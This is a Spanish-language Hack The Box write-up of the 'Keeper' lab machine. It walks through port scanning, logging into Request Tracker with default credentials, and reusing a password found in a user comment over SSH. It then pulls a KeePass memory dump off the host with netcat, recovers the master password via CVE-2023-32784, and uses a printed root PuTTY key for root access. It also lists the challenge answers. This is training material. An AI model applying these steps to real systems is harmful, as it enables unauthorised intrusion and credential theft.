---
title: Writeup keeper - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - keeper
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina keeper en Hack The Box.
keywords:
  - writeup keeper
  - hack the box keeper
  - resolución máquina keeper
  - keeper hack the box
  - htb keeper
---
-------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Keeper)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=Mfz0SoU3HB4)|[Parte2](https://www.youtube.com/watch?v=hhpdMRLZj9I)
- 🧠 **Explicación resumida**: 

---------

#easy #linux #nmap #ping #keepass #kpcli #cd #ls #tratamientotty  #unzip #ssh #CVE-2023-32784 #nc #puttygen 

-------
# Guided Mode

1)¿Cuántos puertos TCP abiertos escucha Keeper?
	2

2)¿Cuál es la contraseña por defecto para el usuario por defecto en Request Tracker (RT)?
	password

3)Además de root, ¿qué otro usuario está en RT?
	lnorgaard

4)¿Cuál es la contraseña del usuario lnorgaard en Keeper?
	Welcome2023!

*La pregunta anterior era la flag de user.txt*
6)¿Cuál es el CVE ID 2023 para una vulnerabilidad en KeePass que permite a un atacante acceder a la contraseña maestra de la base de datos a partir de un volcado de memoria?
	CVE-2023-32784

7)¿Cuál es la contraseña maestra de passcodes.kdbx?
	rødgrød med fløde

8)¿Cuál es la primera línea de la sección «Notas» de la entrada de la base de datos que contiene una clave SSH privada?
	PuTTY-User-Key-File-3: ssh-rsa

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.227
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.227 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.10.11.227 -oN target
```

![[Keeper3.png]]
![[Keeper4.png]]
*TTL:* Maquina linux
*Puertos:*
	`22`[[ssh]]
	`80`HTTP

---------
# Agregar ip a  /etc/hosts
Cuando entramos a la pagina principal http://10.10.11.227 nos redirecciona a este link que se ve en la imagen. Asi que vamos a añadirlo al archivo /etc/hosts
![[Keeper1.png]]
![[Keeper2.png]]
Una vez agregado ya carga la pagina con normalidad

![[Keeper5.png]]

--------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://tickets.keeper.htb/rt/
```

![[Keeper6.png]]
Sabemos que es un ``nginx 1.18.0`` y lo llamativo es lo de ``request-traker 4.4.4 + dfsg-2ubuntu1``

------
# Default Credentials

Buscamos en google las credenciales por defecto y vemos que son
![[Keeper7.png]]
root:password

![[Keeper5.png]]
Introducimos las credenciales en http://tickets.keeper.htb/rt/ y listo. ya estamos adentro

![[Keeper8.png]]

--------

# Conexion por [[ssh]]

Vamos a ir a ver todos los usuarios, a la parte de *users* y despues hacer click en *select* como muestra la imagen
![[Keeper9.png]]
Nos aparecen dos usuarios, ya sabemos que existe otro aparte de root que se llama Inogaard
![[Keeper10.png]]
Si hacemos click sobre su nombre, nos van a salir todas las configuraciones del usuario
![[Keeper11.png]]
Y como vemos en el comentario, nos da la contraseña Welcome2023!

### Ahora vamos a probar conectar por [[ssh]] con estas credenciales, ya que estaba abierto el puerto 22

```
ssh lnorgaard@10.10.11.227 -p 22
```
*Credenciales:* lnorgaard:Welcome2023!
![[Keeper12.png]]
Ya estamos dentro de la maquina

---
# [[Tratamiento de la TTY]]

------
# [[Herramientas-Comandos/unzip]] y nos pasamos los archivos a nuestra maquina con [[Netcat]]

En el escritorio del usuario *Inogaard* Encontramos un archivo *RT30000.zip* asi que lo vamos a descomprimir con [[Herramientas-Comandos/unzip]] usando el comando `unzip RT30000.zip`

![[Keeper13.png]]


Ahora nos vamos a pasar los archivos a nuestra maquina, asi que nos ponemos en escucha con [[Netcat]] desde la maquina victima

```shell
nc -nlvp 5000 < KeePassDumpFull.dmp
nc -nlvp 5000 < passcodes.kdbx
```

![[Keeper17.png]]

Y desde nuestra maquina vamos a entablar la conexion
```shell
nc 10.10.11.227 5000 > KeePassDumpFull.dmp
nc 10.10.11.227 5000 > passcodes.kdbx
```
Aclaracion: Despues de unos segundos hay que cortar la conexion con CTRL + C, por que si no queda activa

![[Keeper16.png]]

Ya tenemos los archivos en nuestra maquina

--------
# [[CVE-2023-32784]]

[Proyecto keepass_dump](https://github.com/z-jxy/keepass_dump) 
Vamos a clonar el proyecto con [[git clone]] usando el comando ``git clone https://github.com/z-jxy/keepass_dump``
![[Keeper18.png]]

Ahora vamos a mover el archivo *KeePassDumpFull.dmp* a la carpeta del proyecto con [[mv]] usando el comando ``mv ~/Desktop/Keeper/content/KeePassDumpFull.dmp .``

Ejecutamos el script
```
python3 keepass_dump.py -f KeePassDumpFull.dmp
```

![[Keeper19.png]]
Y en este caso nos dumpea la contraseña con un caracter desconocido. *{UNKNOWN}dgrd med flde*

Si buscamos esto en google nos va a aparecer
![[Keeper20.png]]
Como podemos ver podemos asumir que la contraseña es: *Rødgrød med Fløde*

---------
# Abrimos el archivo *passcodes.kdbx* con [[kpcli]]


Vamos a ejecutar el comando

```shell
kpcli --kdb passcodes.kdbx
```
Y cuando nos pida contraseña vamos a ingresar *rødgrød med fløde*

Ahora con [[ls]] listamos los directorios, vemos la carpeta passcodes, entramos con [[cd]], listamos directorios nuevamente ,y vemos la carpeta Network, entramos y hay 2 archivos, listamos el contenido del primero  y vemos que nos da una clave ssh

```shell
ls
cd passcodes
ls
cd Network
show 0
```

![[Keeper21.png]]

Podemos ver que dice ``uname: root`` y despues en las notas esta la clave ssh. Asi que asumimos que es del usuario *root*
![[Keeper14.png]]


```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

------
# Conexion por [[puttygen]] y creacion de archivo id_rsa con 

El contenido de la clave rsa que sacamos antes, lo vamos a poner en un archivo, que en este caso lo vamos a llamar ssh-rsa

![[Keeper23.png]]

Ahora vamos a usar [[puttygen]] para crear el archivo *id_rsa*
```shell
puttygen ssh-rsa -O private-openssh -o id_rsa
```

Y luego con [[ssh]] y el archivo de *id_rsa* que creamos antes nos vamos a conectar a la maquina. Y ya podemos catear las flags

```shell
ssh root@10.10.11.227 -i id_rsa
```

![[Keeper22.png]]


-----
# Creditos
[Writeup de 0xdf](https://0xdf-gitlab-io.translate.goog/2024/02/10/htb-keeper.html?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es#)
Writeup oficial HackTheBox